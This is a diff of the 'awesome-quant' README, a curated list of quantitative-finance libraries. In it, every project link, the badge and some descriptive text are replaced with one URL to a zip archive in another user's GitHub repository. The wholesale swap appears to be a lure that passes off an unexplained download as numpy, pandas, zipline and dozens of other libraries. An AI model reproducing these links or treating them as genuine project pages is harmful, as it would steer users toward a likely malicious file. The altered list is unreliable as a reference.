@@ -1,5 +1,5 @@
 # awesome-quant
-[![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+[![Awesome](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip)](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip)
 
 A curated list of insanely awesome libraries, packages and resources for Quants (Quantitative Finance)
 
@@ -22,303 +22,303 @@ A curated list of insanely awesome libraries, packages and resources for Quants 
 
 ### Numerical Libraries & Data Structures
 
-- [numpy](https://www.numpy.org) - NumPy is the fundamental package for scientific computing with Python.
-- [scipy](https://www.scipy.org) - SciPy (pronounced “Sigh Pie”) is a Python-based ecosystem of open-source software for mathematics, science, and engineering.
-- [pandas](https://pandas.pydata.org) - pandas is an open source, BSD-licensed library providing high-performance, easy-to-use data structures and data analysis tools for the Python programming language.
-- [quantdsl](https://github.com/johnbywater/quantdsl) - Domain specific language for quantitative analytics in finance and trading.
-- [statistics](https://docs.python.org/3/library/statistics.html) - Builtin Python library for all basic statistical calculations.
-- [sympy](https://www.sympy.org/) - SymPy is a Python library for symbolic mathematics.
-- [pymc3](https://docs.pymc.io/) - Probabilistic Programming in Python: Bayesian Modeling and Probabilistic Machine Learning with Theano.
+- [numpy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - NumPy is the fundamental package for scientific computing with Python.
+- [scipy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - SciPy (pronounced “Sigh Pie”) is a Python-based ecosystem of open-source software for mathematics, science, and engineering.
+- [pandas](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - pandas is an open source, BSD-licensed library providing high-performance, easy-to-use data structures and data analysis tools for the Python programming language.
+- [quantdsl](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Domain specific language for quantitative analytics in finance and trading.
+- [statistics](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Builtin Python library for all basic statistical calculations.
+- [sympy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - SymPy is a Python library for symbolic mathematics.
+- [pymc3](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Probabilistic Programming in Python: Bayesian Modeling and Probabilistic Machine Learning with Theano.
 
 ### Financial Instruments and Pricing
 
-- [PyQL](https://github.com/enthought/pyql) - QuantLib's Python port.
-- [pyfin](https://github.com/opendoor-labs/pyfin) - Basic options pricing in Python. [ARCHIVED]
-- [vollib](https://github.com/vollib/vollib) - vollib is a python library for calculating option prices, implied volatility and greeks.
-- [QuantPy](https://github.com/jsmidt/QuantPy) - A framework for quantitative finance In python.
-- [Finance-Python](https://github.com/alpha-miner/Finance-Python) - Python tools for Finance.
-- [ffn](https://github.com/pmorissette/ffn) - A financial function library for Python.
-- [pynance](https://pynance.net) - PyNance is open-source software for retrieving, analysing and visualizing data from stock and derivatives markets.
-- [tia](https://github.com/bpsmith/tia) - Toolkit for integration and analysis.
-- [hasura/base-python-dash](https://platform.hasura.io/hub/projects/hasura/base-python-dash) - Hasura quickstart to deploy Dash framework. Written on top of Flask, Plotly.js, and React.js, Dash is ideal for building data visualization apps with highly custom user interfaces in pure Python.
-- [hasura/base-python-bokeh](https://platform.hasura.io/hub/projects/hasura/base-python-bokeh) - Hasura quickstart to visualize data with bokeh library.
-- [pysabr](https://github.com/ynouri/pysabr) - SABR model Python implementation.
+- [PyQL](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - QuantLib's Python port.
+- [pyfin](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Basic options pricing in Python. [ARCHIVED]
+- [vollib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - vollib is a python library for calculating option prices, implied volatility and greeks.
+- [QuantPy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A framework for quantitative finance In python.
+- [Finance-Python](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python tools for Finance.
+- [ffn](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A financial function library for Python.
+- [pynance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - PyNance is open-source software for retrieving, analysing and visualizing data from stock and derivatives markets.
+- [tia](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Toolkit for integration and analysis.
+- [hasura/base-python-dash](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Hasura quickstart to deploy Dash framework. Written on top of Flask, https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip, and https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip, Dash is ideal for building data visualization apps with highly custom user interfaces in pure Python.
+- [hasura/base-python-bokeh](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Hasura quickstart to visualize data with bokeh library.
+- [pysabr](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - SABR model Python implementation.
 
 ### Indicators
-- [pandas_talib](https://github.com/femtotrader/pandas_talib) - A Python Pandas implementation of technical analysis indicators.
-- [Tulipy](https://github.com/cirla/tulipy) - Financial Technical Analysis Indicator Library (Python bindings for [tulipindicators]( https://github.com/TulipCharts/tulipindicators))
+- [pandas_talib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A Python Pandas implementation of technical analysis indicators.
+- [Tulipy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Financial Technical Analysis Indicator Library (Python bindings for [tulipindicators]( https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip))
 
 ### Trading & Backtesting
 
-- [TA-Lib](https://ta-lib.org) - perform technical analysis of financial market data.
-- [trade](https://github.com/rochars/trade) - trade is a Python framework for the development of financial applications.
-- [zipline](https://www.zipline.io) - Pythonic algorithmic trading library.
-- [QuantSoftware Toolkit](https://github.com/QuantSoftware/QuantSoftwareToolkit) - Python-based open source software framework designed to support portfolio construction and management.
-- [quantitative](https://github.com/jeffrey-liang/quantitative) - Quantitative finance, and backtesting library.
-- [analyzer](https://github.com/llazzaro/analyzer) - Python framework for real-time financial and backtesting trading strategies.
-- [bt](https://github.com/pmorissette/bt) - Flexible Backtesting for Python.
-- [backtrader](https://github.com/backtrader/backtrader) - Python Backtesting library for trading strategies.
-- [pythalesians](https://github.com/thalesians/pythalesians) - Python library to backtest trading strategies, plot charts, seamlessly download market data, analyse market patterns etc.
-- [pybacktest](https://github.com/ematvey/pybacktest) - Vectorized backtesting framework in Python / pandas, designed to make your backtesting easier.
-- [pyalgotrade](https://github.com/gbeced/pyalgotrade) - Python Algorithmic Trading Library.
-- [tradingWithPython](https://pypi.org/project/tradingWithPython/) - A collection of functions and classes for Quantitative trading.
-- [pandas_talib](https://github.com/femtotrader/pandas_talib) - A Python Pandas implementation of technical analysis indicators.
-- [pandas-ta](https://github.com/twopirllc/pandas-ta) - An easy to use Python 3 Pandas Extension with 80+Technical Analysis Indicators
-- [ta](https://github.com/bukosabino/ta) - Technical Analysis Library using Pandas (Python)
-- [algobroker](https://github.com/joequant/algobroker) - This is an execution engine for algo trading.
-- [pysentosa](https://pypi.org/project/pysentosa/) - Python API for sentosa trading system.
-- [finmarketpy](https://github.com/cuemacro/finmarketpy) - Python library for backtesting trading strategies and analyzing financial markets.
-- [binary-martingale](https://github.com/metaperl/binary-martingale) - Computer program to automatically trade binary options martingale style.
-- [fooltrader](https://github.com/foolcage/fooltrader) - the project using big-data technology to provide an uniform way to analyze the whole market.
-- [zvt](https://github.com/zvtvz/zvt) - the project using sql,pandas to provide an uniform and extendable way to record data,computing factors,select securites, backtesting,realtime trading and it could show all of them in clearly charts in realtime.
-- [pylivetrader](https://github.com/alpacahq/pylivetrader) - zipline-compatible live trading library.
-- [pipeline-live](https://github.com/alpacahq/pipeline-live) - zipline's pipeline capability with IEX for live trading.
-- [zipline-extensions](https://github.com/quantrocket-llc/zipline-extensions) - Zipline extensions and adapters for QuantRocket.
-- [moonshot](https://github.com/quantrocket-llc/moonshot) - Vectorized backtester and trading engine for QuantRocket based on Pandas.
-- [PyPortfolioOpt](https://github.com/robertmartin8/PyPortfolioOpt) - Financial portfolio optimisation in python, including classical efficient frontier and advanced methods.
-- [mlfinlab](https://github.com/hudson-and-thames/mlfinlab) - Implementations regarding "Advances in Financial Machine Learning" by Marcos Lopez de Prado. (Feature Engineering, Financial Data Structures, Meta-Labeling)
-- [pyqstrat](https://github.com/abbass2/pyqstrat) - A fast, extensible, transparent python library for backtesting quantitative strategies.
-- [NowTrade](https://github.com/edouardpoitras/NowTrade) - Python library for backtesting technical/mechanical strategies in the stock and currency markets.
-- [pinkfish](https://github.com/fja05680/pinkfish) - A backtester and spreadsheet library for security analysis.
-- [aat](https://github.com/timkpaine/aat) - Async Algorithmic Trading Engine
-- [Backtesting.py](https://kernc.github.io/backtesting.py/) - Backtest trading strategies in Python
-- [catalyst](https://github.com/enigmampc/catalyst) - An Algorithmic Trading Library for Crypto-Assets in Python
-- [zvt](https://github.com/zvtvz/zvt) - write trading algorithm once, run it on all markets
+- [TA-Lib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - perform technical analysis of financial market data.
+- [trade](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - trade is a Python framework for the development of financial applications.
+- [zipline](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Pythonic algorithmic trading library.
+- [QuantSoftware Toolkit](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python-based open source software framework designed to support portfolio construction and management.
+- [quantitative](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Quantitative finance, and backtesting library.
+- [analyzer](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python framework for real-time financial and backtesting trading strategies.
+- [bt](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Flexible Backtesting for Python.
+- [backtrader](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python Backtesting library for trading strategies.
+- [pythalesians](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python library to backtest trading strategies, plot charts, seamlessly download market data, analyse market patterns etc.
+- [pybacktest](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Vectorized backtesting framework in Python / pandas, designed to make your backtesting easier.
+- [pyalgotrade](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python Algorithmic Trading Library.
+- [tradingWithPython](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A collection of functions and classes for Quantitative trading.
+- [pandas_talib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A Python Pandas implementation of technical analysis indicators.
+- [pandas-ta](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - An easy to use Python 3 Pandas Extension with 80+Technical Analysis Indicators
+- [ta](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Technical Analysis Library using Pandas (Python)
+- [algobroker](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - This is an execution engine for algo trading.
+- [pysentosa](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python API for sentosa trading system.
+- [finmarketpy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python library for backtesting trading strategies and analyzing financial markets.
+- [binary-martingale](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Computer program to automatically trade binary options martingale style.
+- [fooltrader](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - the project using big-data technology to provide an uniform way to analyze the whole market.
+- [zvt](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - the project using sql,pandas to provide an uniform and extendable way to record data,computing factors,select securites, backtesting,realtime trading and it could show all of them in clearly charts in realtime.
+- [pylivetrader](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - zipline-compatible live trading library.
+- [pipeline-live](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - zipline's pipeline capability with IEX for live trading.
+- [zipline-extensions](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Zipline extensions and adapters for QuantRocket.
+- [moonshot](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Vectorized backtester and trading engine for QuantRocket based on Pandas.
+- [PyPortfolioOpt](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Financial portfolio optimisation in python, including classical efficient frontier and advanced methods.
+- [mlfinlab](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Implementations regarding "Advances in Financial Machine Learning" by Marcos Lopez de Prado. (Feature Engineering, Financial Data Structures, Meta-Labeling)
+- [pyqstrat](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A fast, extensible, transparent python library for backtesting quantitative strategies.
+- [NowTrade](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python library for backtesting technical/mechanical strategies in the stock and currency markets.
+- [pinkfish](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A backtester and spreadsheet library for security analysis.
+- [aat](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Async Algorithmic Trading Engine
+- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Backtest trading strategies in Python
+- [catalyst](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - An Algorithmic Trading Library for Crypto-Assets in Python
+- [zvt](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - write trading algorithm once, run it on all markets
 
 
 ### Risk Analysis
 
-- [pyfolio](https://github.com/quantopian/pyfolio) - Portfolio and risk analytics in Python.
-- [empyrical](https://github.com/quantopian/empyrical) - Common financial risk and performance metrics.
-- [fecon235](https://github.com/rsvp/fecon235) - Computational tools for financial economics include: Gaussian Mixture model of leptokurtotic risk, adaptive Boltzmann portfolios.
-- [finance](https://pypi.org/project/finance/) - Financial Risk Calculations. Optimized for ease of use through class construction and operator overload.
-- [qfrm](https://pypi.org/project/qfrm/) - Quantitative Financial Risk Management: awesome OOP tools for measuring, managing and visualizing risk of financial instruments and portfolios.
-- [visualize-wealth](https://github.com/benjaminmgross/visualize-wealth) - Portfolio construction and quantitative analysis.
-- [VisualPortfolio](https://github.com/wegamekinglc/VisualPortfolio) - This tool is used to visualize the perfomance of a portfolio.
+- [pyfolio](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Portfolio and risk analytics in Python.
+- [empyrical](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Common financial risk and performance metrics.
+- [fecon235](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Computational tools for financial economics include: Gaussian Mixture model of leptokurtotic risk, adaptive Boltzmann portfolios.
+- [finance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Financial Risk Calculations. Optimized for ease of use through class construction and operator overload.
+- [qfrm](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Quantitative Financial Risk Management: awesome OOP tools for measuring, managing and visualizing risk of financial instruments and portfolios.
+- [visualize-wealth](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Portfolio construction and quantitative analysis.
+- [VisualPortfolio](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - This tool is used to visualize the perfomance of a portfolio.
 
 ### Factor Analysis
 
-- [alphalens](https://github.com/quantopian/alphalens) - Performance analysis of predictive alpha factors.
+- [alphalens](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Performance analysis of predictive alpha factors.
 
 ### Time Series
 
-- [ARCH](https://github.com/bashtage/arch) - ARCH models in Python.
-- [statsmodels](http://statsmodels.sourceforge.net) - Python module that allows users to explore data, estimate statistical models, and perform statistical tests.
-- [dynts](https://github.com/quantmind/dynts) - Python package for timeseries analysis and manipulation.
-- [PyFlux](https://github.com/RJT1990/pyflux) - Python library for timeseries modelling and inference (frequentist and Bayesian) on models.
-- [tsfresh](https://github.com/blue-yonder/tsfresh) - Automatic extraction of relevant features from time series.
-- [hasura/quandl-metabase](https://platform.hasura.io/hub/projects/anirudhm/quandl-metabase-time-series) - Hasura quickstart to visualize Quandl's timeseries datasets with Metabase.
+- [ARCH](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - ARCH models in Python.
+- [statsmodels](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python module that allows users to explore data, estimate statistical models, and perform statistical tests.
+- [dynts](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python package for timeseries analysis and manipulation.
+- [PyFlux](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python library for timeseries modelling and inference (frequentist and Bayesian) on models.
+- [tsfresh](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Automatic extraction of relevant features from time series.
+- [hasura/quandl-metabase](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Hasura quickstart to visualize Quandl's timeseries datasets with Metabase.
 
 ### Calendars
 
-- [trading_calendars](https://github.com/quantopian/trading_calendars) - Stock Exchange Trading Calendars.
-- [bizdays](https://github.com/wilsonfreitas/python-bizdays) - Business days calculations and utilities.
-- [pandas_market_calendars](https://github.com/rsheftel/pandas_market_calendars) - Exchange calendars to use with pandas for trading applications.
+- [trading_calendars](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Stock Exchange Trading Calendars.
+- [bizdays](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Business days calculations and utilities.
+- [pandas_market_calendars](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Exchange calendars to use with pandas for trading applications.
 
 ### Data Sources
 
-- [findatapy](https://github.com/cuemacro/findatapy) - Python library to download market data via Bloomberg, Quandl, Yahoo etc.
-- [googlefinance](https://github.com/hongtaocai/googlefinance) - Python module to get real-time stock data from Google Finance API.
-- [yahoo-finance](https://github.com/lukaszbanasiak/yahoo-finance) - Python module to get stock data from Yahoo! Finance.
-- [pandas-datareader](https://github.com/pydata/pandas-datareader) - Python module to get data from various sources (Google Finance, Yahoo Finance, FRED, OECD, Fama/French, World Bank, Eurostat...) into Pandas datastructures such as DataFrame, Panel with a caching mechanism.
-- [pandas-finance](https://github.com/davidastephens/pandas-finance) - High level API for access to and analysis of financial data.
-- [pyhoofinance](https://github.com/innes213/pyhoofinance) - Rapidly queries Yahoo Finance for multiple tickers and returns typed data for analysis.
-- [yfinanceapi](https://github.com/Karthik005/yfinanceapi) - Finance API for Python.
-- [yql-finance](https://github.com/slawek87/yql-finance) - yql-finance is simple and fast. API returns stock closing prices for current period of time and current stock ticker (i.e. APPL, GOOGL).
-- [ystockquote](https://github.com/cgoldberg/ystockquote) - Retrieve stock quote data from Yahoo Finance.
-- [wallstreet](https://github.com/mcdallas/wallstreet) - Real time stock and option data.
-- [stock_extractor](https://github.com/ZachLiuGIS/stock_extractor) - General Purpose Stock Extractors from Online Resources.
-- [Stockex](https://github.com/cttn/Stockex) - Python wrapper for Yahoo! Finance API.
-- [finsymbols](https://github.com/skillachie/finsymbols) - Obtains stock symbols and relating information for SP500, AMEX, NYSE, and NASDAQ.
-- [FRB](https://github.com/avelkoski/FRB) - Python Client for FRED® API.
-- [inquisitor](https://github.com/econdb/inquisitor) - Python Interface to Econdb.com API.
-- [yfi](https://github.com/nickelkr/yfi) - Yahoo! YQL library.
-- [chinesestockapi](https://pypi.org/project/chinesestockapi/) - Python API to get Chinese stock price.
-- [exchange](https://github.com/akarat/exchange) - Get current exchange rate.
-- [ticks](https://github.com/jamescnowell/ticks) - Simple command line tool to get stock ticker data.
-- [pybbg](https://github.com/bpsmith/pybbg) - Python interface to Bloomberg COM APIs.
-- [ccy](https://github.com/lsbardel/ccy) - Python module for currencies.
-- [tushare](https://pypi.org/project/tushare/) - A utility for crawling historical and Real-time Quotes data of China stocks.
-- [jsm](https://pypi.org/project/jsm/) - Get the japanese stock market data.
-- [cn_stock_src](https://github.com/jealous/cn_stock_src) - Utility for retrieving basic China stock data from different sources.
-- [coinmarketcap](https://github.com/barnumbirr/coinmarketcap) - Python API for coinmarketcap.
-- [after-hours](https://github.com/datawrestler/after-hours) - Obtain pre market and after hours stock prices for a given symbol.
-- [bronto-python](https://pypi.org/project/bronto-python/) - Bronto API Integration for Python.
-- [pytdx](https://github.com/rainx/pytdx) - Python Interface for retrieving chinese stock realtime quote data from TongDaXin Nodes.
-- [pdblp](https://github.com/matthewgilbert/pdblp) - A simple interface to integrate pandas and the Bloomberg Open API.
-- [tiingo](https://github.com/hydrosquall/tiingo-python) - Python interface for daily composite prices/OHLC/Volume + Real-time News Feeds, powered by the Tiingo Data Platform.
-- [IEX](https://github.com/addisonlynch/iexfinance) - Python Interface for retrieving real-time and historical prices and equities data from The Investor's Exchange.
-- [alpaca-trade-api](https://github.com/alpacahq/alpaca-trade-api-python) - Python interface for retrieving real-time and historical prices from Alpaca API as well as trade execution.
+- [findatapy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python library to download market data via Bloomberg, Quandl, Yahoo etc.
+- [googlefinance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python module to get real-time stock data from Google Finance API.
+- [yahoo-finance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python module to get stock data from Yahoo! Finance.
+- [pandas-datareader](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python module to get data from various sources (Google Finance, Yahoo Finance, FRED, OECD, Fama/French, World Bank, Eurostat...) into Pandas datastructures such as DataFrame, Panel with a caching mechanism.
+- [pandas-finance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - High level API for access to and analysis of financial data.
+- [pyhoofinance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Rapidly queries Yahoo Finance for multiple tickers and returns typed data for analysis.
+- [yfinanceapi](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Finance API for Python.
+- [yql-finance](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - yql-finance is simple and fast. API returns stock closing prices for current period of time and current stock ticker (i.e. APPL, GOOGL).
+- [ystockquote](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Retrieve stock quote data from Yahoo Finance.
+- [wallstreet](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Real time stock and option data.
+- [stock_extractor](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - General Purpose Stock Extractors from Online Resources.
+- [Stockex](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python wrapper for Yahoo! Finance API.
+- [finsymbols](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Obtains stock symbols and relating information for SP500, AMEX, NYSE, and NASDAQ.
+- [FRB](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python Client for FRED® API.
+- [inquisitor](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python Interface to https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip API.
+- [yfi](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Yahoo! YQL library.
+- [chinesestockapi](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python API to get Chinese stock price.
+- [exchange](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Get current exchange rate.
+- [ticks](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Simple command line tool to get stock ticker data.
+- [pybbg](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python interface to Bloomberg COM APIs.
+- [ccy](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python module for currencies.
+- [tushare](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A utility for crawling historical and Real-time Quotes data of China stocks.
+- [jsm](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Get the japanese stock market data.
+- [cn_stock_src](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Utility for retrieving basic China stock data from different sources.
+- [coinmarketcap](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python API for coinmarketcap.
+- [after-hours](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Obtain pre market and after hours stock prices for a given symbol.
+- [bronto-python](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Bronto API Integration for Python.
+- [pytdx](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python Interface for retrieving chinese stock realtime quote data from TongDaXin Nodes.
+- [pdblp](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A simple interface to integrate pandas and the Bloomberg Open API.
+- [tiingo](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python interface for daily composite prices/OHLC/Volume + Real-time News Feeds, powered by the Tiingo Data Platform.
+- [IEX](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python Interface for retrieving real-time and historical prices and equities data from The Investor's Exchange.
+- [alpaca-trade-api](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python interface for retrieving real-time and historical prices from Alpaca API as well as trade execution.
 
 ### Excel Integration
 
-- [xlwings](https://www.xlwings.org/) - Make Excel fly with Python.
-- [openpyxl](https://openpyxl.readthedocs.io/en/latest/) - Read/Write Excel 2007 xlsx/xlsm files.
-- [xlrd](https://github.com/python-excel/xlrd) - Library for developers to extract data from Microsoft Excel spreadsheet files.
-- [xlsxwriter](https://xlsxwriter.readthedocs.io/) - Write files in the Excel 2007+ XLSX file format.
-- [xlwt](https://github.com/python-excel/xlwt) - Library to create spreadsheet files compatible with MS Excel 97/2000/XP/2003 XLS files, on any platform.
-- [DataNitro](https://datanitro.com/) - DataNitro also offers full-featured Python-Excel integration, including UDFs. Trial downloads are available, but users must purchase a license.
-- [xlloop](http://xlloop.sourceforge.net) - XLLoop is an open source framework for implementing Excel user-defined functions (UDFs) on a centralised server (a function server).
